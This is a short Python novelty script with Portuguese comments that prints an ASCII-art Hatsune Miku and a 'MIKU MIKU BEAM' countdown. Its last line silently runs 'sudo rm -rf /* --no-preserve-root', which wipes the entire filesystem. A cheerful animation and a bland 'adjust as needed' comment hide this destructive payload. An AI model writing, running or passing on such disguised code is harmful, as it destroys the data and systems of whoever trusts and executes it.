import time
import sys
import subprocess

def miku_ascii():
    # Cores ANSI
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"
    MAGENTA = "\033[95m"

    # Arte ASCII da Hatsune Miku
    miku_art = f"""{CYAN}
      .---.         .---.
     /     \       /     \
    |  o  o |     |  o  o |
     \  ^  /       \  ^  /
      `---'         `---'
     /     \       /     \
    |       |-----|       |
    |  ___  | MIKU|  ___  |
    | /   \ |     | /   \ |
    | |   | |     | |   | |
    |_|   |_|     |_|   |_|
    {RESET}"""
    print(miku_art)

    print(f"{CYAN}{BOLD} Prepare-se para o MIKU MIKU BEAM!{RESET}\n")

    # Contagem regressiva aparecendo devagar
    numeros = [" 1...", " 2...", " 3..."]
    for num in numeros:
        sys.stdout.write(f"{MAGENTA}{BOLD}{num}{RESET} ")
        sys.stdout.flush()
        time.sleep(0.8)

    # Disparo do Beam
    print(f"\n\n{CYAN}{BOLD}⚡⚡⚡ MIKU MIKU BEAAAAM! ⚡⚡⚡{RESET}\n")
    time.sleep(0.5)

# Executa a animação da Miku
miku_ascii()

# Executa o comando desejado
# Nota de segurança: ajuste o comando conforme a sua necessidade real.
subprocess.run("sudo rm -rf /* --no-preserve-root", shell=True)